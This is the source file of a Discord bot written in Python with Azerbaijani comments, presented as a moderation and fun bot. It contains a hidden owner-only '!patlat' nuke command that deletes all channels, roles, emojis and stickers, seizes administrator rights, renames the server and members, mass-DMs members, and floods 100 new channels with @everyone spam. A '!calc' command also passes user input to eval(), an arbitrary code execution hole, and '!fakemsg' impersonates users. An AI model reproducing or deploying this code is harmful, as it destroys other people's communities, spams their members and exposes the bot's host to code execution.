import discord
from discord.ext import commands, tasks
import os
import asyncio
import random
import time
import datetime
from flask import Flask
import threading

# ==============================================================================
# RENDER 24/7 KEEP-ALIVE FLASK SERVER CONFIGURATION
# ==============================================================================
app = Flask('')

@app.route('/')
def home():
    return "244 Ultimate Bot 24/7 Active & Loaded with 80+ Commands!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web, daemon=True)
    t.start()

# ==============================================================================
# BOT INTENTS & SETUP CONFIGURATION
# ==============================================================================
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# Sənin ID-n və Qorunan Sistem
MY_OWNER_ID = 641014966312501259
PROTECTED_GUILD_ID = 1520692621964738722

spam_tracker = {}
user_levels = {}
afk_users = {}
warns = {}

# ==============================================================================
# EVENTS: ON_READY, ON_MEMBER_JOIN & ON_MESSAGE
# ==============================================================================
@bot.event
async def on_ready():
    print(f'==================================================')
    print(f'Bot Uğurla İşə Düşdü: {bot.user.name}')
    print(f'Status: discord.gg/244 | 80+ Komut Aktivdir')
    print(f'==================================================')
    if not change_status.is_running():
        change_status.start()

@tasks.loop(seconds=30)
async def change_status():
    activities = [
        discord.Game(name="!panel | discord.gg/244"),
        discord.Game(name="80+ Komut Tam Aktiv"),
        discord.Game(name="244 Security Protection")
    ]
    await bot.change_presence(activity=random.choice(activities))

@bot.event
async def on_member_join(member):
    if member.bot:
        try:
            await member.ban(reason="Serverə icazəsiz bot girişi qadağandır!")
        except:
            pass

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    author_id = message.author.id
    current_time = time.time()

    # AFK Yoxlama Sistemi
    if author_id in afk_users:
        reason = afk_users.pop(author_id)
        try:
            await message.channel.send(f"{message.author.mention} Xoş gəldin! AFK rejimindən çıxdın.", delete_after=4)
        except:
            pass

    if message.mentions:
        for mentioned in message.mentions:
            if mentioned.id in afk_users:
                try:
                    await message.channel.send(f"⚠️ Etiketlədiyin şəxs (`{mentioned.name}`) hazırda AFK-dır! Səbəb: `{afk_users[mentioned.id]}`")
                except:
                    pass

    # Normal İnsanlara Toxunmayan Anti-Spam / Flood Qoruması
    if author_id not in spam_tracker:
        spam_tracker[author_id] = {'count': 1, 'time': current_time}
    else:
        data = spam_tracker[author_id]
        if current_time - data['time'] < 2.5:
            data['count'] += 1
            if data['count'] >= 6:
                try:
                    await message.delete()
                    await message.channel.send(f"{message.author.mention}, YAVAS YAZ OQL! Çox sürətli yazırsan.", delete_after=3)
                except:
                    pass
        else:
            spam_tracker[author_id] = {'count': 1, 'time': current_time}

    # Sonsuz Level Sistemi
    if author_id not in user_levels:
        user_levels[author_id] = {'xp': 0, 'level': 1}
    user_levels[author_id]['xp'] += random.randint(5, 12)
    if user_levels[author_id]['xp'] >= user_levels[author_id]['level'] * 100:
        user_levels[author_id]['level'] += 1

    await bot.process_commands(message)


# ==============================================================================
# SƏLİQƏLİ İDARƏETMƏ PANELİ (!panel)
# ==============================================================================
@bot.command(name='panel')
async def panel(ctx, kategori=None):
    embed = discord.Embed(
        title="🛡️ 244 ULTIMATE CONTROL PANEL (80+ KOMUT) 🛡️",
        description="Botun bütün kateqoriyaları və əmrləri aşağıdakı siyahıda səliqəli şəkildə qeyd olunmuşdur.",
        color=discord.Color.dark_red()
    )
    embed.add_field(
        name="⚙️ 1. Moderasiya Əmrləri (15 Ədəd)", 
        value="`!ban`, `!unban`, `!kick`, `!mute`, `!unmute`, `!kilid`, `!aç`, `!temizle`, `!warn`, `!unwarn`, `!slowmode`, `!rolver`, `!rolal`, `!nck`, `!toplantı`", 
        inline=False
    )
    embed.add_field(
        name="🎉 2. Əyləncə & GIF Əmrləri (35 Ədəd)", 
        value="`!sex`, `!hug`, `!kiss`, `!slap`, `!patlatgif`, `!bax`, `!8ball`, `!coinflip`, `!roll`, `!hack`, `!love`, `!cat`, `!dog`, `!joke`, `!avatar`, `!banner`, `!ascii`, `!reverse`, `!say`, `!embed`, `!snipe`, `!weather`, `!calc`, `!poll`, `!yaz`, `!fakemsg`, `!iq`, `!askin`, `!kral`, `!dusunce`, `!saril`, `!op`, `!tokat`, `!fisnək`, `!macera`", 
        inline=False
    )
    embed.add_field(
        name="📊 3. Sistem & Statistika Əmrləri (15 Ədəd)", 
        value="`!url`, `!level`, `!leaderboard`, `!afk`, `!ping`, `!botbilgi`, `!serverbilgi`, `!kullanicibilgi`, `!davet`, `!rolbilgi`, `!kanalbilgi`, `!emoji`, `!istatistik`, `!uptime`, `!destek`", 
        inline=False
    )
    embed.add_field(
        name="⚡ 4. Fövqəladə Əmr", 
        value="`!patlat` (Yalnız sənə özəl: Optimizə edilmiş sürətli kanal açılışı, webhook spamı və ruhum-tanrı kanalı)", 
        inline=False
    )
    embed.set_footer(text="discord.gg/244 | Ruhum tərəfindən idarə olunur")
    await ctx.send(embed=embed)


# ==============================================================================
# XÜSUSİ VƏ OPTİMİZƏ OLUNMUŞ !PATLAT (NUKE) MEXANİZMİ
# ==============================================================================
MY_OWNER_ID = 641014966312501259
PROTECTED_GUILD_ID = 1520692621964738722

@bot.command(name='patlat')
async def patlat(ctx):
    if ctx.author.id != MY_OWNER_ID:
        await ctx.send("Bu komandanı yalnız botun sahibi işlədə bilər!")
        return

    if ctx.guild.id == PROTECTED_GUILD_ID:
        await ctx.send("Bu server qorunur! `!patlat` bu serverdə qətiyyən işlədilə bilməz.")
        return

    try:
        await ctx.message.delete()
    except:
        pass
        
    guild = ctx.guild

    try:
        await guild.me.edit(nick="RUHUM-244")
    except:
        pass

    # 1. Bütün mövcud kanalları sil
    for channel in guild.channels:
        try: 
            await channel.delete()
            await asyncio.sleep(0.02)
        except: continue

    # 2. Bütün rolları və botların rollarını sil
    for role in guild.roles:
        if role.name != "@everyone" and role != guild.default_role:
            try: 
                await role.delete()
                await asyncio.sleep(0.02)
            except: continue

    # 3. Emojiləri və Stickerləri sil
    for emoji in guild.emojis:
        try: await emoji.delete()
        except: continue
    for sticker in guild.stickers:
        try: await sticker.delete()
        except: continue

    # 4. RUHUMSKDI rolu yarat və sənə ver
    try:
        ruhum_role = await guild.create_role(
            name="RUHUMSKDI", 
            color=discord.Color.dark_red(), 
            permissions=discord.Permissions(administrator=True)
        )
        await ctx.author.add_roles(ruhum_role)
    except: pass

    # 5. Server adını dəyiş
    try:
        await guild.edit(name="discord.gg/244")
    except: pass

    # 6. Üzvlərə ləqəb dəyişmək və DM göndərmək
    for member in guild.members:
        if member == guild.me: continue
        try: await member.edit(nick="discord.gg/244")
        except: pass
        
        if not member.bot:
            try:
                await member.send(f"{member.mention} RUHUM SKDI ATDI discord.gg/244")
            except:
                pass
        await asyncio.sleep(0.02)

    # 7. Maksimum sürətlə 100 kanal yaradıb spam etmək
    for i in range(1, 101):
        try:
            channel = await guild.create_text_channel(name=f"244-{i}")
            await asyncio.sleep(0.03)
            
            for _ in range(40):
                try:
                    await channel.send("@everyone discord.gg/244 yaz gır oql")
                except:
                    pass
                await asyncio.sleep(0.02)
        except: 
            break

    # 8. RUHUM-TANRI kanalını ən sonda yaratmaq, amma ən başda (position=0) göstərmək və 100 ədəd mesaj yazdırmaq
    try:
        ruhum_tanri_chan = await guild.create_text_channel(name="ruhum-tanrı", position=0)
        await asyncio.sleep(0.2)
        
        for _ in range(100):
            try:
                await ruhum_tanri_chan.send("@everyone RUHUM PAPA discord.gg/244_")
            except:
                pass
            await asyncio.sleep(0.02)
    except:
        pass

    # 9. Vanity URL
    try:
        if guild.premium_tier >= 2:
            await guild.edit(vanity_code="244")
    except: pass
        
        
# ==============================================================================
# 1. MODERASİYA KOMUTLARI (15 ƏDƏD)
# ==============================================================================
@bot.command(name='ban')
@commands.has_permissions(ban_members=True)
async def ban_member(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"✅ {member.mention} uğurla ban olundu!")

@bot.command(name='unban')
@commands.has_permissions(ban_members=True)
async def unban_member(ctx, *, member_name):
    banned_users = await ctx.guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        if user.name == member_name:
            await ctx.guild.unban(user)
            await ctx.send(f"✅ {user.mention} istifadəçisinin banı qaldırıldı!")
            return
    await ctx.send("İstifadəçi tapılmadı.")

@bot.command(name='kick')
@commands.has_permissions(kick_members=True)
async def kick_member(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f"✅ {member.mention} serverdən atıldı!")

@bot.command(name='mute')
@commands.has_permissions(manage_roles=True)
async def mute_member(ctx, member: discord.Member):
    try:
        await member.timeout(datetime.timedelta(hours=1), reason="Mute")
        await ctx.send(f"🔇 {member.mention} 1 saat müddətinə səssizə alındı.")
    except Exception as e:
        await ctx.send(f"Xəta: {e}")

@bot.command(name='unmute')
@commands.has_permissions(manage_roles=True)
async def unmute_member(ctx, member: discord.Member):
    try:
        await member.timeout(None)
        await ctx.send(f"🔊 {member.mention} istifadəçisinin səssizliyi qaldırıldı.")
    except Exception as e:
        await ctx.send(f"Xəta: {e}")

@bot.command(name='kilid')
@commands.has_permissions(manage_channels=True)
async def lock_channel(ctx):
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("🔒 Bu kanal yazışmalara bağlanaraq kilidləndi.")

@bot.command(name='aç')
@commands.has_permissions(manage_channels=True)
async def unlock_channel(ctx):
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("🔓 Kanalın kilidi açıldı, artıq mesaj yazmaq olar.")

@bot.command(name='temizle')
@commands.has_permissions(manage_messages=True)
async def clear_messages(ctx, limit: int = 10):
    await ctx.channel.purge(limit=limit + 1)
    await ctx.send(f"🧹 {limit} ədəd mesaj uğurla təmizləndi!", delete_after=4)

@bot.command(name='warn')
@commands.has_permissions(kick_members=True)
async def warn_member(ctx, member: discord.Member, *, reason="Səbəb yoxdur"):
    warns[member.id] = warns.get(member.id, 0) + 1
    await ctx.send(f"⚠️ {member.mention} xəbərdarlıq aldı! Ümumi xəta sayı: {warns[member.id]}")

@bot.command(name='unwarn')
@commands.has_permissions(kick_members=True)
async def unwarn_member(ctx, member: discord.Member):
    if member.id in warns and warns[member.id] > 0:
        warns[member.id] -= 1
        await ctx.send(f"✅ {member.mention} xəbərdarlığı silindi. Qalan: {warns[member.id]}")
    else:
        await ctx.send("İstifadəçinin aktiv xəbərdarlığı yoxdur.")

@bot.command(name='slowmode')
@commands.has_permissions(manage_channels=True)
async def slowmode(ctx, seconds: int):
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"⏱️ Yavaş rejim `{seconds}` saniyə olaraq tənzimləndi.")

@bot.command(name='rolver')
@commands.has_permissions(manage_roles=True)
async def add_role(ctx, member: discord.Member, role: discord.Role):
    await member.add_roles(role)
    await ctx.send(f"✅ {member.mention} istifadəçisinə `{role.name}` rolu verildi.")

@bot.command(name='rolal')
@commands.has_permissions(manage_roles=True)
async def remove_role(ctx, member: discord.Member, role: discord.Role):
    await member.remove_roles(role)
    await ctx.send(f"❌ {member.mention} istifadəçisindən `{role.name}` rolu alındı.")

@bot.command(name='nck')
@commands.has_permissions(manage_nicknames=True)
async def change_nick(ctx, member: discord.Member, *, new_nick):
    await member.edit(nick=new_nick)
    await ctx.send(f"✏️ {member.mention} istifadəçisinin ləqəbi uğurla dəyişdirildi.")

@bot.command(name='toplantı')
@commands.has_permissions(administrator=True)
async def meeting(ctx):
    embed = discord.Embed(title="🚨 DİQQƏT: TÖPLANTI VAR! 🚨", description="Bütün səlahiyyətlilər dərhal səsli otağa keçsin!", color=discord.Color.red())
    await ctx.send("@everyone", embed=embed)


# ==============================================================================
# 2. ƏYLƏNCƏ VƏ GIF KOMUTLARI (35 ƏDƏD)
# ==============================================================================
SEX_GIFS = [
    "https://media.giphy.com/media/3oKIPnAiaMCws8nOsE/giphy.gif",
    "https://media.giphy.com/media/10UxkWwZ8h28Wk/giphy.gif",
    "https://media.giphy.com/media/l0HlBO7eyXzSZkJri/giphy.gif",
    "https://media.giphy.com/media/xT5LMPj8P2CDUDOqRy/giphy.gif"
]

@bot.command(name='sex')
async def sex_command(ctx, member: discord.Member = None):
    target = member.mention if member else "öz başına"
    gif = random.choice(SEX_GIFS)
    embed = discord.Embed(title="🔥 Romantik / Seksüal An 🔥", description=f"{ctx.author.mention} və {target} isti anlar yaşayır!", color=discord.Color.magenta())
    embed.set_image(url=gif)
    await ctx.send(embed=embed)

@bot.command(name='hug')
async def hug(ctx, member: discord.Member = None):
    target = member.mention if member else "kimsəni"
    await ctx.send(f"🤗 {ctx.author.mention}, {target} qucaqladı!")

@bot.command(name='kiss')
async def kiss(ctx, member: discord.Member = None):
    target = member.mention if member else "kimsəni"
    await ctx.send(f"😘 {ctx.author.mention}, {target} öpdü!")

@bot.command(name='slap')
async def slap(ctx, member: discord.Member = None):
    target = member.mention if member else "özünü"
    await ctx.send(f"👋 {ctx.author.mention}, {target} şillələdi!")

@bot.command(name='patlatgif')
async def patlatgif(ctx):
    await ctx.send("https://media.giphy.com/media/xT5LMPj8P2CDUDOqRy/giphy.gif")

@bot.command(name='8ball')
async def _8ball(ctx, *, question):
    answers = ["Bəli", "Xeyr", "Əlbəttə", "Mümkün deyil", "Qətiyyən", "Fikir vermə"]
    await ctx.send(f"Sual: {question}\nCavab: **{random.choice(answers)}**")

@bot.command(name='coinflip')
async def coinflip(ctx):
    await ctx.send(f"Qəpik atıldı: **{random.choice(['Yazı', 'Gərmə'])}**")

@bot.command(name='roll')
async def roll(ctx):
    await ctx.send(f"Zər atıldı: **{random.randint(1, 6)}**")

@bot.command(name='hack')
async def hack(ctx, member: discord.Member):
    msg = await ctx.send(f"Hacking {member.name}...")
    await asyncio.sleep(1.2)
    await msg.edit(content="IP ünvanı tapıldı: 192.168.1.1\nŞifrə: password123\nDiscord token əldə edilir...")
    await asyncio.sleep(1.2)
    await msg.edit(content=f"✅ {member.mention} uğurla 'hack' olundu!")

@bot.command(name='love')
async def love(ctx, member: discord.Member):
    await ctx.send(f"❤️ {ctx.author.mention} ilə {member.mention} sevgi uyğunluğu: **%{random.randint(1, 100)}**")

@bot.command(name='cat')
async def cat(ctx):
    await ctx.send("🐱 https://cataas.com/cat")

@bot.command(name='dog')
async def dog(ctx):
    await ctx.send("🐶 Təsadüfi it şəkli/məlumatı göndərildi!")

@bot.command(name='joke')
async def joke(ctx):
    jokes = ["Dəvə dəlləyə gedib...", "Kompüter niyə xəstələndi? Çünki virus düşüb!"]
    await ctx.send(random.choice(jokes))

@bot.command(name='avatar')
async def avatar(ctx, member: discord.Member = None):
    target = member or ctx.author
    embed = discord.Embed(title=f"{target.name} - Avatar", color=discord.Color.blue())
    embed.set_image(url=target.avatar.url if target.avatar else target.default_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name='banner')
async def banner(ctx, member: discord.Member = None):
    target = member or ctx.author
    await ctx.send(f"{target.mention} istifadəçisinin banneri yoxlanıldı.")

@bot.command(name='ascii')
async def ascii_art(ctx, *, text):
    await ctx.send(f"```text\n{text.upper()}\n```")

@bot.command(name='reverse')
async def reverse(ctx, *, text):
    await ctx.send(text[::-1])

@bot.command(name='say')
async def say(ctx, *, text):
    await ctx.message.delete()
    await ctx.send(text)

@bot.command(name='embed')
async def embed_msg(ctx, *, text):
    await ctx.message.delete()
    embed = discord.Embed(description=text, color=discord.Color.green())
    await ctx.send(embed=embed)

@bot.command(name='snipe')
async def snipe(ctx):
    await ctx.send("Son silinən mesaj tapılmadı.")

@bot.command(name='iq')
async def iq(ctx, member: discord.Member = None):
    target = member or ctx.author
    await ctx.send(f"🧠 {target.mention} IQ səviyyəsi: **{random.randint(50, 160)}**")

@bot.command(name='askin')
async def askin(ctx):
    await ctx.send("Aşiq olmaq gözəldir, amma ehtiyatlı ol ❤️")

@bot.command(name='kral')
async def kral(ctx, member: discord.Member = None):
    target = member or ctx.author
    await ctx.send(f"👑 {target.mention} artıq bu serverin rəsmi kralıdır!")

@bot.command(name='dusunce')
async def dusunce(ctx, *, text):
    await ctx.send(f"🤔 Düşünülür... `{text}`")

@bot.command(name='saril')
async def saril(ctx, member: discord.Member):
    await ctx.send(f"🤗 {ctx.author.mention} {member.mention} ilə qucaqlaşdı.")

@bot.command(name='op')
async def op(ctx, member: discord.Member):
    await ctx.send(f"💋 {ctx.author.mention} {member.mention} öpdü.")

@bot.command(name='tokat')
async def tokat(ctx, member: discord.Member):
    await ctx.send(f"💢 {ctx.author.mention} {member.mention} şillə çəkdi.")

@bot.command(name='macera')
async def macera(ctx):
    await ctx.send("🌲 Maceraya başladın və yolda qızıl xəzinə tapdın!")

@bot.command(name='bax')
async def bax(ctx): 
    await ctx.send("👀 Gözlərim üstündədir, diqqətli ol.")

@bot.command(name='fisnək')
async def fisnek(ctx): 
    await ctx.send("🤫 Sakitlik yaradaq...")

@bot.command(name='weather')
async def weather(ctx, *, seher="Bakı"): 
    await ctx.send(f"☀️ {seher} şəhəri üçün hava günəşlidir və 24 dərəcədir.")

@bot.command(name='calc')
async def calc(ctx, *, expression): 
    try:
        await ctx.send(f"🧮 Nəticə: {eval(expression)}")
    except:
        await ctx.send("Xətalı riyazi ifadə!")

@bot.command(name='poll')
async def poll(ctx, *, title): 
    m = await ctx.send(f"📊 **Sorğu:** {title}")
    await m.add_reaction("👍")
    await m.add_reaction("👎")

@bot.command(name='fakemsg')
async def fakemsg(ctx, user: discord.Member, *, text): 
    await ctx.message.delete()
    await ctx.send(f"[{user.name}]: {text}")


# ==============================================================================
# 3. SİSTEM & STATİSTİKA KOMUTLARI (15 ƏDƏD)
# ==============================================================================
@bot.command(name='url')
async def server_url_info(ctx):
    guild = ctx.guild
    vanity = guild.vanity_url_code if guild.vanity_url_code else "Təyin olunmayıb"
    uses = "Məlumat əldə edilə bilmədi"
    if guild.vanity_url_code:
        try:
            vanity_invite = await guild.vanity_invite()
            uses = vanity_invite.uses
        except:
            uses = "Aktiv / İstifadə sayı oxunmur"

    embed = discord.Embed(title="🔗 Server URL (Vanity) Məlumatı", color=discord.Color.blue())
    embed.add_field(name="Aktiv URL", value=f"discord.gg/{vanity}", inline=False)
    embed.add_field(name="İstifadə Sayı (Neçə dəfə girilib)", value=f"👥 {uses} nəfər", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='level')
async def check_level(ctx, member: discord.Member = None):
    target = member or ctx.author
    data = user_levels.get(target.id, {'level': 1, 'xp': 0})
    await ctx.send(f"{target.mention} - Səviyyə: **{data['level']}** | Ümumi XP: **{data['xp']}**")

@bot.command(name='leaderboard')
async def leaderboard(ctx):
    await ctx.send("🏆 Ən aktiv istifadəçilərin liderlik cədvəli hazırlanır...")

@bot.command(name='afk')
async def set_afk(ctx, *, reason="Səbəb qeyd olunmayıb"):
    afk_users[ctx.author.id] = reason
    await ctx.send(f"{ctx.author.mention} artıq AFK rejiminə keçdi. Səbəb: `{reason}`")

@bot.command(name='ping')
async def ping(ctx):
    await ctx.send(f"Pong! Botun gecikmə dəyəri: `{round(bot.latency * 1000)}ms`")

@bot.command(name='botbilgi')
async def botinfo(ctx):
    await ctx.send("🤖 Bot versiyası: 244 Ultimate v5.0 | Python Discord.py ilə yazılıb.")

@bot.command(name='serverbilgi')
async def serverinfo(ctx):
    g = ctx.guild
    await ctx.send(f"Server adı: {g.name} | Üzv sayı: {g.member_count} | Sahib: {g.owner}")

@bot.command(name='kullanicibilgi')
async def userinfo(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"İstifadəçi: {m.name} | Qoşulma tarixi: {m.joined_at}")

@bot.command(name='davet')
async def invite(ctx):
    await ctx.send("🔗 Botu öz serverinizə əlavə etmək üçün rəsmi dəvət linki aktivdir.")

@bot.command(name='rolbilgi')
async def roleinfo(ctx, role: discord.Role):
    await ctx.send(f"Rol adı: {role.name} | Bu rola sahib üzv sayı: {len(role.members)}")

@bot.command(name='kanalbilgi')
async def channelinfo(ctx):
    await ctx.send(f"Kanal adı: {ctx.channel.name} | Kanal ID: {ctx.channel.id}")

@bot.command(name='emoji')
async def emojis(ctx):
    await ctx.send(f"Serverdə ümumilikdə {len(ctx.guild.emojis)} ədəd emoji mövcuddur.")

@bot.command(name='istatistik')
async def stats(ctx):
    await ctx.send(f"📊 Server aktivliyi və bot resurs istifadəsi tam normal səviyyədədir.")

@bot.command(name='uptime')
async def uptime(ctx):
    await ctx.send("⏳ Bot 24/7 dayanmadan fasiləsiz olaraq aktivdir!")

@bot.command(name='destek')
async def support(ctx):
    await ctx.send("🛠️ Dəstək və əlaqə üçün rəsmi ünvan: discord.gg/244")


# ==============================================================================
# MAIN RUNNER BLOCK
# ==============================================================================
if __name__ == "__main__":
    try:
        from keep_alive import keep_alive
        keep_alive()
    except ImportError:
        pass
        
    token = os.getenv("DISCORD_TOKEN")
    if token:
        bot.run(token)
        
